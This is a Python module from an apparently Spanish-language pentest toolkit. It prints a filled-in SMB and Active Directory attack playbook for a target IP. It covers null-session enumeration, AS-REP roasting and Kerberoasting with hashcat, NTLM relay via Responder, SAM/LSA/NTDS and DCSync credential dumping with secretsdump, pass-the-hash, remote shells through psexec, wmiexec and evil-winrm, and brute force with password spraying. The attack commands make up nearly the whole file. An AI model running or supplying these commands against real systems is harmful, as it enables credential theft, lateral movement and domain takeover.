import sys

class Colors:
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def _cmd(c): sys.stdout.buffer.write(f"    {Colors.OKGREEN}{c}{Colors.ENDC}\n".encode('utf-8')); sys.stdout.buffer.flush()
def _tip(c): print(f"    {Colors.OKCYAN}# {c}{Colors.ENDC}")
def _header(t): print(f"\n{Colors.BOLD}── {t} ──{Colors.ENDC}\n")

def run(ip, user=None, password=None):
    print(f"{Colors.BOLD}{'='*60}{Colors.ENDC}")
    print(f"{Colors.OKCYAN}  MÓDULO SMB v2.0 — OBSIDIAN TIER{Colors.ENDC}")
    print(f"{Colors.BOLD}{'='*60}{Colors.ENDC}")

    has_creds = bool(user and password)
    cred_str = f"{user}:{password}" if has_creds else "Sesión Nula (sin credenciales)"
    print(f"\n{Colors.OKCYAN}[*] Target: {ip} | Modo: {cred_str}{Colors.ENDC}\n")

    if not has_creds:
        _header("FASE 1: Enumeración Sin Credenciales")

        print(f"  {Colors.WARNING}[Shares — Sesión Nula]{Colors.ENDC}")
        _cmd(f"smbclient -L //{ip}/ -N")
        _cmd(f"crackmapexec smb {ip} -u '' -p '' --shares")
        _cmd(f"smbmap -H {ip}")
        print()

        print(f"  {Colors.WARNING}[Enum4Linux — Enumeración Completa]{Colors.ENDC}")
        _cmd(f"enum4linux -a {ip}")
        _cmd(f"enum4linux-ng -A {ip} -oJ enum4linux_output")
        print()

        print(f"  {Colors.WARNING}[Usuarios via RPC]{Colors.ENDC}")
        _cmd(f"rpcclient -U '' -N {ip} -c 'enumdomusers'")
        _cmd(f"rpcclient -U '' -N {ip} -c 'querydispinfo'")
        _cmd(f"crackmapexec smb {ip} -u '' -p '' --users")
        _cmd(f"impacket-lookupsid anonymous@{ip}")
        print()

        print(f"  {Colors.WARNING}[LDAP Anonymous Bind]{Colors.ENDC}")
        _cmd(f"ldapsearch -x -H ldap://{ip} -b '' -s base namingContexts")
        _cmd(f"ldapsearch -x -H ldap://{ip} -b 'DC=dominio,DC=local' '(objectClass=user)' sAMAccountName")
        _cmd(f"ldapdomaindump {ip} -o /tmp/ldap_dump/")
        print()

        _header("FASE 2: Ataques Sin Credenciales")

        print(f"  {Colors.WARNING}[AS-REP Roasting — Hash sin contraseña]{Colors.ENDC}")
        _cmd(f"impacket-GetNPUsers DOMINIO/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip {ip}")
        _cmd(f"python Farei_0x.py hashes asrep.txt  # Identificar modo Hashcat")
        _cmd(f"hashcat -m 18200 -a 0 asrep.txt /usr/share/wordlists/rockyou.txt")
        print()

        print(f"  {Colors.WARNING}[ZeroLogon — CVE-2020-1472 (DC sin parchear)]{Colors.ENDC}")
        _cmd(f"python Farei_0x.py cve 'CVE-2020-1472'")
        _cmd(f"python3 zerologon_tester.py NOMBRE_DC {ip}")
        print()

        print(f"  {Colors.WARNING}[MS17-010 EternalBlue (Windows 7 / Server 2008)]{Colors.ENDC}")
        _cmd(f"nmap --script smb-vuln-ms17-010 -p 445 {ip}")
        _cmd(f"python Farei_0x.py cve 'MS17-010'")
        print()

        print(f"  {Colors.WARNING}[NTLM Relay — Capturar y redirigir autenticaciones]{Colors.ENDC}")
        _tip("Requiere Responder + ntlmrelayx y que SMB signing esté deshabilitado")
        _cmd(f"crackmapexec smb {ip} --gen-relay-list relay_targets.txt")
        _cmd(f"impacket-ntlmrelayx -tf relay_targets.txt -smb2support")
        _cmd(f"sudo python3 Responder.py -I tun0 -rdwv")
        print()

    else:
        _header("FASE 1: Enumeración Con Credenciales")

        print(f"  {Colors.WARNING}[Shares y Acceso]{Colors.ENDC}")
        _cmd(f"smbclient -L //{ip}/ -U '{user}%{password}'")
        _cmd(f"crackmapexec smb {ip} -u '{user}' -p '{password}' --shares")
        _cmd(f"smbmap -H {ip} -u '{user}' -p '{password}'")
        _cmd(f"smbclient //{ip}/SHARE_NAME -U '{user}%{password}'")
        print()

        print(f"  {Colors.WARNING}[Spiderar todo el contenido de shares]{Colors.ENDC}")
        _cmd(f"crackmapexec smb {ip} -u '{user}' -p '{password}' -M spider_plus")
        _cmd(f"smbmap -H {ip} -u '{user}' -p '{password}' -R --depth 5")
        print()

        print(f"  {Colors.WARNING}[Dumpear credenciales SAM / LSA / NTDS]{Colors.ENDC}")
        _cmd(f"crackmapexec smb {ip} -u '{user}' -p '{password}' --sam")
        _cmd(f"crackmapexec smb {ip} -u '{user}' -p '{password}' --lsa")
        _cmd(f"impacket-secretsdump '{user}:{password}@{ip}'")
        _cmd(f"impacket-secretsdump '{user}:{password}@{ip}' -just-dc  # Solo NTDS.dit (DC)")
        print()

        print(f"  {Colors.WARNING}[Kerberoasting — Tickets de Servicio]{Colors.ENDC}")
        _cmd(f"impacket-GetUserSPNs DOMINIO/{user}:'{password}' -request -dc-ip {ip} -outputfile kerberoast.txt")
        _cmd(f"hashcat -m 13100 -a 0 kerberoast.txt /usr/share/wordlists/rockyou.txt")
        _cmd(f"python Farei_0x.py hashes kerberoast.txt")
        print()

        print(f"  {Colors.WARNING}[BloodHound — Mapear Active Directory]{Colors.ENDC}")
        _cmd(f"bloodhound-python -u '{user}' -p '{password}' -ns {ip} -d DOMINIO -c all")
        _cmd(f"python Farei_0x.py ad {ip} DOMINIO --parse 20240101000000_users.json")
        print()

        _header("FASE 2: Ejecución Remota")

        print(f"  {Colors.WARNING}[Ejecutar comandos remotos]{Colors.ENDC}")
        _cmd(f"crackmapexec smb {ip} -u '{user}' -p '{password}' -x 'whoami /all'")
        _cmd(f"impacket-psexec '{user}:{password}@{ip}'")
        _cmd(f"impacket-wmiexec '{user}:{password}@{ip}'")
        _cmd(f"impacket-smbexec '{user}:{password}@{ip}'")
        _cmd(f"evil-winrm -i {ip} -u '{user}' -p '{password}'")
        print()

        print(f"  {Colors.WARNING}[Pass-The-Hash — Con hash NTLM]{Colors.ENDC}")
        _cmd(f"crackmapexec smb {ip} -u '{user}' -H HASH_NTLM --shares")
        _cmd(f"impacket-psexec {user}@{ip} -hashes :HASH_NTLM")
        _cmd(f"impacket-wmiexec {user}@{ip} -hashes :HASH_NTLM")
        _cmd(f"evil-winrm -i {ip} -u '{user}' -H HASH_NTLM")
        print()

        print(f"  {Colors.WARNING}[DCSync — Dump de todos los hashes del dominio (como DA)]{Colors.ENDC}")
        _cmd(f"impacket-secretsdump '{user}:{password}@{ip}' -just-dc-ntlm")
        _cmd(f"python Farei_0x.py hashes ntds_dump.txt  # Identificar todos los hashes")
        print()

    _header("FASE FINAL: Fuerza Bruta")
    _cmd(f"crackmapexec smb {ip} -u usuarios.txt -p passwords.txt --continue-on-success")
    _cmd(f"crackmapexec smb {ip} -u users.txt -p 'Password123' --continue-on-success  # Password Spray")
    _cmd(f"hydra -L usuarios.txt -P /usr/share/wordlists/rockyou.txt smb://{ip}")
    _tip("Password Spray: 1 password contra todos los usuarios — evita lockout")

    print(f"\n{Colors.BOLD}{'='*60}{Colors.ENDC}")
    print(f"{Colors.OKCYAN}[*] Tip: Después de dumpear hashes → python Farei_0x.py hashes secretsdump.txt{Colors.ENDC}")
    print(f"{Colors.BOLD}{'='*60}{Colors.ENDC}")
